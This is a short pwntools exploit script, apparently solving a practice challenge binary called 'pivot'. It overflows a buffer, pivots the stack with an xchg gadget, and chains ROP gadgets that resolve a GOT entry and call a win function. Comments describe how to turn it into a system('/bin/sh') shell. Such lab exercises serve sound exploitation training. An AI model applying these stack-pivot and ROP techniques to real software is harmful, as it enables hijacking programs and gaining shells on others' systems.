from pwn import *

foothold_plt     = 0x400850
foothold_got_plt = 0x602048

pop_rax      = 0x400b00 # pop rax ; ret
pop_rbp      = 0x400900 # pop rbp ; ret
pop_rdi      = 0x400b73 # pop rdi ; ret

xchg_rax_rsp = 0x400b02 # xchg rsp, rax ; ret
mov_rax      = 0x400b05 # mov rax, [rax] ; ret
add_rax_rbp  = 0x400b09 # add rax, rbp ; ret
call_rax     = 0x40098e # call rax

# Start process and send rop chain
e = process('pivot')

text = e.recv()
print text
pivot = int(text.splitlines()[4].split()[-1], 16)
print "[+] Pivot is " + hex(pivot)

# Uncomment to attach GDB
# gdb.attach(e, 'break *pwnme+166')

# Stage 2 is loaded first, but since we already have our pivot address, we can focus on constructing the second stage payload.
# rop_stage2 calls foothold_function() to populate its GOT entry, then queries that value into RAX
# Since we have the lib, the offset between foothold_function() and ret2win is 0x14e.
# Add that to the queried value then call RAX
rop_stage2 = p64(foothold_plt)
rop_stage2 += p64(pop_rax)
rop_stage2 += p64(foothold_got_plt)
rop_stage2 += p64(mov_rax)
rop_stage2 += p64(pop_rbp)

# Change this offset to point to system@plt AND pop '/bin/sh\x00' into RDI to call system('/bin/sh') and get a lovely shell
rop_stage2 += p64(0x14e)

rop_stage2 += p64(add_rax_rbp)
rop_stage2 += p64(call_rax)

e.sendline(rop_stage2)

# Stage 1 ROP: Jump to pivot by exchanging RSP with RAX
rop_stage1 = "A" * 40
rop_stage1 += p64(pop_rax)
rop_stage1 += p64(pivot)
rop_stage1 += p64(xchg_rax_rsp)

e.sendline(rop_stage1)

# If you're trying to get a shell remove this line and call e.interactive()
print e.recvall()
